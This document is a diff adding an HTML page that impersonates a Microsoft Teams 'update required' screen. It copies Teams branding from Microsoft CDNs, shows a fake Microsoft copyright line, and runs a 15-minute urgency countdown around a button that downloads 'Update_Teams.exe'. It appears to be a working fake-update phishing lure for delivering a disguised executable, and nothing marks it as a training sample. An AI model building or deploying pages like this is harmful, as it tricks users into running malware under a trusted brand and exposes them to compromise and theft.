@@ -1,0 +1,92 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Microsoft Teams Update</title>
+    <link rel="icon" href="https://statics.teams.cdn.office.net/hashedimages/favicon/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0px 0px 25px rgba(0,0,0,0.1);
+            width: 420px;
+            text-align: center;
+        }
+        img.logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: #2b579a;
+        }
+        p {
+            font-size: 15px;
+            margin-bottom: 25px;
+        }
+        .countdown {
+            font-size: 14px;
+            font-weight: bold;
+            color: #e81123;
+            margin-bottom: 20px;
+        }
+        a.download-btn {
+            background-color: #6264A7;
+            color: white;
+            padding: 12px 25px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            display: inline-block;
+        }
+        a.download-btn:hover {
+            background-color: #464775;
+        }
+        .footer {
+            font-size: 11px;
+            color: #888;
+            margin-top: 40px;
+        }
+    </style>
+    <script>
+        let countdownTime = 900;
+        function updateCountdown() {
+            const element = document.getElementById('countdown');
+            const minutes = Math.floor(countdownTime / 60);
+            const seconds = countdownTime % 60;
+            element.textContent = minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+            if (countdownTime > 0) {
+                countdownTime--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+        window.onload = updateCountdown;
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://static2.sharepointonline.com/files/fabric/assets/brand-icons/product/svg/teams_48x1.svg" alt="Teams Logo" class="logo">
+        <h1>Microsoft Teams Update Required</h1>
+        <p>To continue using Microsoft Teams, please download and install the latest update.</p>
+        <div class="countdown">Estimated time remaining: <span id="countdown">15:00</span></div>
+        <a class="download-btn" href="Update_Teams.exe" download>Download Update</a>
+        <div class="footer">
+            © 2025 Microsoft Corporation. All rights reserved. Microsoft Teams and its logos are trademarks of the Microsoft group of companies.
+        </div>
+    </div>
+</body>
+</html>
